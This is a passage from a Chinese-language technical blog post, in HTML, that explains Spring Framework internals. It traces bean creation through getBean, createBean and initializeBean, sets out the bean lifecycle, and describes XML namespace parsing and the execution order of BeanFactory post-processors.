<li>FactoryBean是指实现了FactoryBean接口的Bean，是一种工厂Bean。它实现了<code>getObject()</code>方法返回其它自定义类型的Bean，Spring的IOC容器会调用其<code>getObject()</code>方法获取Bean。我们举一个例子：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// FactoryBean类型的Bean</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFactoryBean</span> <span class="keyword">implements</span> <span class="title class_">FactoryBean</span>&lt;User&gt;&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// getObject方法中生产真正的Bean</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;liduoan&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> User.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建ApplicationContext</span></span><br><span class="line">    <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>();</span><br><span class="line">    <span class="comment">// 获取User类型的Bean</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> ctx.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">    System.out.println(user.getName());</span><br><span class="line">    <span class="comment">// 获取Bean时加&amp;号，可以获得对应的FactoryBean类型的Bean</span></span><br><span class="line">    <span class="type">UserFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> (UserFactoryBean) ctx.getBean(<span class="string">&quot;&amp;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一种典型的<strong>工厂模式</strong>，比如大家熟悉的<code>SqlSessionFactoryBean</code>就是这样一种工厂Bean。</p>
</blockquote>
<p>最后还是使用<code>getBean</code>来真正实例化<code>Bean</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="comment">// 调用doGetBean方法</span></span><br><span class="line">    <span class="keyword">return</span> doGetBean(name, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">doGetBean</span><span class="params">(<span class="keyword">final</span> String name, <span class="meta">@Nullable</span> <span class="keyword">final</span> Class&lt;T&gt; requiredType,</span></span><br><span class="line"><span class="params">                          <span class="meta">@Nullable</span> <span class="keyword">final</span> Object[] args, <span class="type">boolean</span> typeCheckOnly)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 得到真实的bean的名字</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> transformedBeanName(name);</span><br><span class="line">    Object bean;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先从容器缓存中获取Bean，拿到了直接返回，没有拿到再创建</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">sharedInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br><span class="line">    <span class="comment">// 如果从缓存中获取到Bean</span></span><br><span class="line">    <span class="keyword">if</span> (sharedInstance != <span class="literal">null</span> &amp;&amp; args == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 直接获取bean</span></span><br><span class="line">            bean = getObjectForBeanInstance(sharedInstance, name, beanName, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有从缓存中获取到Bean</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果是多例bean并且正在创建，则会抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (isPrototypeCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCurrentlyInCreationException</span>(beanName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取父工厂，SpringMVC中会用到</span></span><br><span class="line">        <span class="type">BeanFactory</span> <span class="variable">parentBeanFactory</span> <span class="operator">=</span> getParentBeanFactory();</span><br><span class="line">        <span class="comment">// 这里省略</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!typeCheckOnly) &#123;</span><br><span class="line">            <span class="comment">// 将当前bean标记为正在创建</span></span><br><span class="line">            markBeanAsCreated(beanName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">RootBeanDefinition</span> <span class="variable">mbd</span> <span class="operator">=</span> getMergedLocalBeanDefinition(beanName);</span><br><span class="line">            checkMergedBeanDefinition(mbd, beanName, args);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断DependsOn注解</span></span><br><span class="line">            <span class="comment">// @DependsOn:如果A依赖B，则B会被先加载</span></span><br><span class="line">            String[] dependsOn = mbd.getDependsOn();</span><br><span class="line">            <span class="keyword">if</span> (dependsOn != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String dep : dependsOn) &#123;</span><br><span class="line">                    ... </span><br><span class="line"></span><br><span class="line">                        registerDependentBean(dep, beanName);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 优先加载所有依赖的Bean</span></span><br><span class="line">                        getBean(dep);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 创建单例bean</span></span><br><span class="line">                <span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line">                    <span class="comment">// 调用DefaultSingletonBeanRegistry的getSingleton方法</span></span><br><span class="line">                    <span class="comment">// lambda表达式实现了ObjectFactory接口的getObject方法</span></span><br><span class="line">                    <span class="comment">// 将getObject方法方法作为参数传给getSingleton方法</span></span><br><span class="line">                    <span class="comment">// 在getSingleton方法中会调用这个getObject方法创建Bean</span></span><br><span class="line">                    sharedInstance = getSingleton(beanName, () -&gt; &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="comment">// getSingleton回调createBean方法创建Bean</span></span><br><span class="line">                            <span class="comment">// 这里调用了第一个Bean的后置处理器</span></span><br><span class="line">                            <span class="keyword">return</span> createBean(beanName, mbd, args);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">                            destroySingleton(beanName);</span><br><span class="line">                            <span class="keyword">throw</span> ex;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                    bean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 省略代码</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> (T) bean;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h5 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h5><p>最后调用<code>createBean</code>完成创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">createBean</span><span class="params">(String beanName, RootBeanDefinition mbd, <span class="meta">@Nullable</span> Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用第一个bean后置处理器，此时bean还没有创建，这里可以阻止bean的创建</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> resolveBeforeInstantiation(beanName, mbdToUse);</span><br><span class="line">            <span class="keyword">if</span> (bean != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果后置处理器创建了bean直接返回</span></span><br><span class="line">                <span class="keyword">return</span> bean;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbdToUse.getResourceDescription(), beanName,</span><br><span class="line">                                        <span class="string">&quot;BeanPostProcessor before instantiation of bean failed&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 否则由Spring来创建，这个doCreateBean方法才是真正的创建过程</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">beanInstance</span> <span class="operator">=</span> doCreateBean(beanName, mbdToUse, args);</span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(<span class="string">&quot;Finished creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> beanInstance;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前面绕来绕去，终于来到了实例化Bean的地方</span></span><br><span class="line"><span class="comment">// 这个方法完成了bean的实例化、填充属性和初始化过程</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">doCreateBean</span><span class="params">(<span class="keyword">final</span> String beanName, <span class="keyword">final</span> RootBeanDefinition mbd, <span class="keyword">final</span> <span class="meta">@Nullable</span> Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanWrapper</span> <span class="variable">instanceWrapper</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line">        instanceWrapper = <span class="built_in">this</span>.factoryBeanInstanceCache.remove(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (instanceWrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 实例化bean：工厂方法、有参构造、无参构造</span></span><br><span class="line">        instanceWrapper = createBeanInstance(beanName, mbd, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 属性赋值(调用setter方法)，这里完成了@Autowired的赋值</span></span><br><span class="line">            <span class="comment">// 触发bean后置处理器postProcessAfterInstantiation方法</span></span><br><span class="line">            populateBean(beanName, mbd, instanceWrapper);</span><br><span class="line">            <span class="comment">// 最后初始化，调用各种Aware和初始化方法</span></span><br><span class="line">            exposedObject = initializeBean(beanName, exposedObject, mbd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> exposedObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bean的初始化方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">initializeBean</span><span class="params">(<span class="keyword">final</span> String beanName, <span class="keyword">final</span> Object bean, <span class="meta">@Nullable</span> RootBeanDefinition mbd)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// invokeAwareMethods方法调用3个Aware</span></span><br><span class="line">            <span class="comment">// 1. BeanNameAware</span></span><br><span class="line">            <span class="comment">// 2. BeanClassLoaderAware</span></span><br><span class="line">            <span class="comment">// 3. BeanFactoryAware</span></span><br><span class="line">            invokeAwareMethods(beanName, bean);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">wrappedBean</span> <span class="operator">=</span> bean;</span><br><span class="line">    <span class="keyword">if</span> (mbd == <span class="literal">null</span> || !mbd.isSynthetic()) &#123;</span><br><span class="line">        <span class="comment">// 这里会调用bean后置处理器的postProcessBeforeInitialization方法</span></span><br><span class="line">        <span class="comment">// 这里又会调用其余的一堆Aware</span></span><br><span class="line">        wrappedBean = applyBeanPostProcessorsBeforeInitialization(wrappedBean, beanName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// invokeInitMethods会调用Bean初始化的回调方法：</span></span><br><span class="line">        <span class="comment">// 1. 实现InitializingBean接口类的afterPropertiesSet方法</span></span><br><span class="line">        <span class="comment">// 2. initMethod指定的方法</span></span><br><span class="line">        invokeInitMethods(beanName, wrappedBean, mbd);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mbd == <span class="literal">null</span> || !mbd.isSynthetic()) &#123;</span><br><span class="line">            <span class="comment">// 这里会调用后置处理器的PostProcessAfterInitialization方法</span></span><br><span class="line">            wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrappedBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，Bean就实例化完成了，最后一步就是在DefaultSingletonBeanRegistry类中的<code>getSingleton</code>方法里，将创建完成的Bean放入单例池中。</p>
<p>Spring中Bean的生命周期如下：</p>
<ol>
<li>实例化Bean对象，这个时候Bean的对象是非常低级的，基本不能够被我们使用，因为连最基本的属性都没有设置，@Autowired注解都是没有解析的 。</li>
<li>填充属性，当做完这一步，Bean对象基本是完整的了，@Autowired注解已经解析完毕，依赖注入完成了。</li>
<li>如果Bean实现了BeanNameAware接口，则调用setBeanName方法。</li>
<li>如果Bean实现了BeanClassLoaderAware接口，则调用setBeanClassLoader方法。</li>
<li>如果Bean实现了BeanFactoryAware接口，则调用setBeanFactory方法。</li>
<li>调用BeanPostProcessor(Bean后置处理器)的postProcessBeforeInitialization方法。</li>
<li>如果Bean实现了InitializingBean接口，调用afterPropertiesSet方法。</li>
<li>如果Bean指定了initMethod方法，则调用Bean的initMethod指定的方法。</li>
<li>调用BeanPostProcessor(Bean后置处理器)的postProcessAfterInitialization方法。当进行到这一步，Bean已经被准备就绪了，一直停留在应用的上下文中，直到被销毁。</li>
<li>如果应用的上下文被销毁了，如果Bean实现了DisposableBean接口，则调用destroy方法，如果Bean指定了destoryMethod销毁方法也会被调用。</li>
</ol>
<h1 id="后置处理器解析"><a href="#后置处理器解析" class="headerlink" title="后置处理器解析"></a>后置处理器解析</h1><h2 id="基于XML的解析过程"><a href="#基于XML的解析过程" class="headerlink" title="基于XML的解析过程"></a>基于XML的解析过程</h2><p>基于XML的配置类解析过程和基于注解方式的有所不同，基于XML的配置类解析过程是一种<strong>耦合</strong>的解析方式，它没有使用到我们之前介绍的BeanFactory的后置处理器，也就是那些创世纪的类。XML方式配置类解析开始的地方在<code>refresh</code>方法中的此处：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xml是在这里解析Bean定义的，耦合方式</span></span><br><span class="line"><span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();</span><br></pre></td></tr></table></figure>

<p>主要流程就是通过XML的<strong>读取器</strong>读取XML配置文件，将其封装为Document对象，最后将其解析为Bean定义。</p>
<p>其中有一点需要注意。在XML配置方式中，我们经常使用这个注解(使用到了<code>context</code>命名空间)，像这样的注解会使用到<strong>命名空间</strong>。Spring在解析的过程中，会在<code>spring-context</code>模块的<code>META-INF/spring.handlers</code>文件中找到命名空间对应的处理器类，比如<code>context</code>命名空间的处理器如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Context命名空间处理器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextNamespaceHandler</span> <span class="keyword">extends</span> <span class="title class_">NamespaceHandlerSupport</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;property-placeholder&quot;</span>, </span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">PropertyPlaceholderBeanDefinitionParser</span>());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;property-override&quot;</span>, </span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">PropertyOverrideBeanDefinitionParser</span>());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;annotation-config&quot;</span>,</span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">AnnotationConfigBeanDefinitionParser</span>());</span><br><span class="line">        <span class="comment">// &lt;context:component-scan&gt;的解析器</span></span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;component-scan&quot;</span>, </span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">ComponentScanBeanDefinitionParser</span>());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;load-time-weaver&quot;</span>, </span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">LoadTimeWeaverBeanDefinitionParser</span>());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;spring-configured&quot;</span>, </span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">SpringConfiguredBeanDefinitionParser</span>());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;mbean-export&quot;</span>, </span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">MBeanExportBeanDefinitionParser</span>());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">&quot;mbean-server&quot;</span>,</span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">MBeanServerBeanDefinitionParser</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>&lt;context:component-scan&gt;</code>的解析器ComponentScanBeanDefinitionParser中，就会通过XML的<strong>扫描器</strong>进行包扫描，最后将所有的Bean解析为Bean定义完成注册。XML具体解析过程大家可以自己查看源码，本文不过多介绍。</p>
<h2 id="基于注解的解析过程"><a href="#基于注解的解析过程" class="headerlink" title="基于注解的解析过程"></a>基于注解的解析过程</h2><h3 id="BeanFactory后置处理器"><a href="#BeanFactory后置处理器" class="headerlink" title="BeanFactory后置处理器"></a>BeanFactory后置处理器</h3><p>相比于基于XML方式配置类的解析，基于注解的解析过程进行了解耦，通过<strong>BeanFactory的后置处理器</strong>进行解析，因此更高级一些。</p>
<p>BeanFactory的后置处理器主要有下面两个作用：</p>
<ul>
<li>修改Bean定义：实现<strong>BeanFactoryPostProcessor</strong>接口，并且实现postProcessBeanFactory方法，<strong>可以拿到BeanFactory对象，从而修改Bean定义</strong>。</li>
<li>注册Bean定义：实现<code>BeanFactoryPostProcessor</code>的子接口<strong>BeanDefinitionRegistryPostProcessor</strong>，并且实现<code>postProcessBeanDefinitionRegistry</code>方法，<strong>可以拿到BeanDefinitionRegistry对象</strong>，从而添加Bean定义。</li>
</ul>
<p>之前我们介绍了，在初始化扫描器Reader的时候会创建很多Spring内置的Bean工厂后置处理器，也就是创世纪的类。其中最最重要的是<strong>ConfigurationClassPostProcessor</strong>，它就是注解方式下解析配置类的Bean工厂后置处理器，没有它其它的Bean都不会存在。我么来看看它的结构：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/13/2gCJVhPfSoI6uQx.jpg"
                      alt="Screenshot_78.jpg"
                ></p>
<p>可以看到，<strong>BeanFactoryPostProcessor</strong>和<strong>BeanDefinitionRegistryPostProcessor</strong>它都实现了。另外它还实现了两个用于排序的接口，这两个接口主要用于决定执行顺序，在后续的代码中可以看到。</p>
<h3 id="后置处理器的执行顺序"><a href="#后置处理器的执行顺序" class="headerlink" title="后置处理器的执行顺序"></a>后置处理器的执行顺序</h3><p>让我们进入源码来看吧</p>
<p>首先我们知晓，在<code>this.reader = new AnnotatedBeanDefinitionReader(this);</code>中完成了一系列的后置处理器的定义。</p>
<p>接下来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用我们的bean工厂的后置处理器.</span></span><br><span class="line"><span class="comment">//1. 会在此将class扫描成beanDefinition  </span></span><br><span class="line"><span class="comment">//2.bean工厂的后置处理器调用getBean</span></span><br><span class="line">invokeBeanFactoryPostProcessors(beanFactory);</span><br></pre></td></tr></table></figure>

<p>它会调用<code>refresh</code>方法里的<code>invokeBeanFactoryPostProcessors</code>方法来完成后置处理器的执行</p>
<p>再次进去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">invokeBeanFactoryPostProcessors</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">	<span class="comment">//  获取两处存储BeanFactoryPostProcessor的对象 传入供接下来的调用</span></span><br><span class="line">	<span class="comment">//  1.当前Bean工厂，</span></span><br><span class="line">       <span class="comment">//  2.和我们自己调用addBeanFactoryPostProcessor的自定义BeanFactoryPostProcessor</span></span><br><span class="line">       <span class="comment">//  注意到getBeanFactoryPostProcessors()是我们对</span></span><br><span class="line">       <span class="comment">//  context.addBeanFactoryPostProcessor(xxx);</span></span><br><span class="line">       <span class="comment">//  当我们使用了上述的方法，才会在getBeanFactoryPostProcessors()返回</span></span><br><span class="line">	PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());</span><br><span class="line"></span><br><span class="line">	.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面我们知道调用Bean工厂的后置处理器，里面的方法是Bean工厂和某个函数【大多数下这个参数为空</p>
<p>那接着走吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeBeanFactoryPostProcessors</span><span class="params">(</span></span><br><span class="line"><span class="params">    ConfigurableListableBeanFactory beanFactory, List&lt;BeanFactoryPostProcessor&gt; beanFactoryPostProcessors)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用BeanDefinitionRegistryPostProcessor的后置处理器 Begin</span></span><br><span class="line">    <span class="comment">// 定义已处理的后置处理器</span></span><br><span class="line">    Set&lt;String&gt; processedBeans = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断我们的beanFactory实现了BeanDefinitionRegistry(实现了该结构就有注册和获取Bean定义的能力）</span></span><br><span class="line">    <span class="keyword">if</span> (beanFactory <span class="keyword">instanceof</span> BeanDefinitionRegistry) &#123;</span><br><span class="line">        <span class="comment">//强行把我们的bean工厂转为BeanDefinitionRegistry，因为待会需要注册Bean定义</span></span><br><span class="line">        <span class="type">BeanDefinitionRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> (BeanDefinitionRegistry) beanFactory;</span><br><span class="line">        <span class="comment">//保存BeanFactoryPostProcessor类型的后置   BeanFactoryPostProcessor 提供修改</span></span><br><span class="line">        List&lt;BeanFactoryPostProcessor&gt; regularPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//保存BeanDefinitionRegistryPostProcessor类型的后置处理器 BeanDefinitionRegistryPostProcessor 提供注册</span></span><br><span class="line">        List&lt;BeanDefinitionRegistryPostProcessor&gt; registryProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环我们传递进来的beanFactoryPostProcessors</span></span><br><span class="line">        .......</span><br><span class="line">            <span class="comment">//一般为空</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//定义一个集合用户保存当前准备创建的BeanDefinitionRegistryPostProcessor</span></span><br><span class="line">            List&lt;BeanDefinitionRegistryPostProcessor&gt; currentRegistryProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一步:去beanFactory容器中获取BeanDefinitionRegistryPostProcessor的bean的处理器名称</span></span><br><span class="line">        String[] postProcessorNames =</span><br><span class="line">            beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环筛选出来的匹配BeanDefinitionRegistryPostProcessor的类型名称</span></span><br><span class="line">        <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">            <span class="comment">//判断是否实现了PriorityOrdered接口的  如果是就最优先去调用</span></span><br><span class="line">            <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;</span><br><span class="line">                <span class="comment">//显示的调用getBean()的方式获取出该对象然后加入到currentRegistryProcessors集合中去</span></span><br><span class="line">                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));</span><br><span class="line">                <span class="comment">//同时也加入到processedBeans集合中去</span></span><br><span class="line">                processedBeans.add(ppName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对currentRegistryProcessors集合中BeanDefinitionRegistryPostProcessor进行排序</span></span><br><span class="line">        sortPostProcessors(currentRegistryProcessors, beanFactory);</span><br><span class="line">        <span class="comment">// 把当前的加入到总的里面去</span></span><br><span class="line">        registryProcessors.addAll(currentRegistryProcessors);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * 在这里典型的BeanDefinitionRegistryPostProcessor就是</span></span><br><span class="line"><span class="comment">			 ConfigurationClassPostProcessor</span></span><br><span class="line"><span class="comment">			 * 用于进行bean定义的加载 比如我们的包扫描，<span class="doctag">@import</span>  等等。。。。。。。。。</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">        <span class="comment">//这个方法很重要，后续再说</span></span><br><span class="line">        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);</span><br><span class="line">        <span class="comment">//调用完之后，马上clea掉</span></span><br><span class="line">        currentRegistryProcessors.clear();</span><br><span class="line">        <span class="comment">//-----调用内置实现PriorityOrdered接口ConfigurationClassPostProcessor完毕--优先级No1-End------</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//======================================================================================</span></span><br><span class="line">        <span class="comment">//实现了优先级最高的Bean后置处理器的调用</span></span><br><span class="line">        <span class="comment">//去容器中获取BeanDefinitionRegistryPostProcessor的bean的处理器名称（内置的和上面注册的）</span></span><br><span class="line">        postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//循环上一步获取的BeanDefinitionRegistryPostProcessor的类型名称</span></span><br><span class="line">        <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">            <span class="comment">//表示没有被处理过,且实现了Ordered接口的</span></span><br><span class="line">            <span class="comment">//!processedBeans.contains(ppName) 不在上面那个队列中</span></span><br><span class="line">            <span class="keyword">if</span> (!processedBeans.contains(ppName) &amp;&amp; beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;</span><br><span class="line">                <span class="comment">//显示的调用getBean()的方式获取出该对象然后加入到currentRegistryProcessors集合中去</span></span><br><span class="line">                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));</span><br><span class="line">                <span class="comment">//同时也加入到processedBeans集合中去</span></span><br><span class="line">                processedBeans.add(ppName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对currentRegistryProcessors集合中BeanDefinitionRegistryPostProcessor进行排序</span></span><br><span class="line">        sortPostProcessors(currentRegistryProcessors, beanFactory);</span><br><span class="line">        <span class="comment">//把他加入到用于保存到registryProcessors中</span></span><br><span class="line">        registryProcessors.addAll(currentRegistryProcessors);</span><br><span class="line">        <span class="comment">//调用他的后置处理方法</span></span><br><span class="line">        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);</span><br><span class="line">        <span class="comment">//调用完之后，马上clea掉</span></span><br><span class="line">        currentRegistryProcessors.clear();</span><br><span class="line">        <span class="comment">//--------调用自定义Order接口BeanDefinitionRegistryPostProcessor完毕-优先级No2-End---</span></span><br><span class="line"></span><br><span class="line">        <span 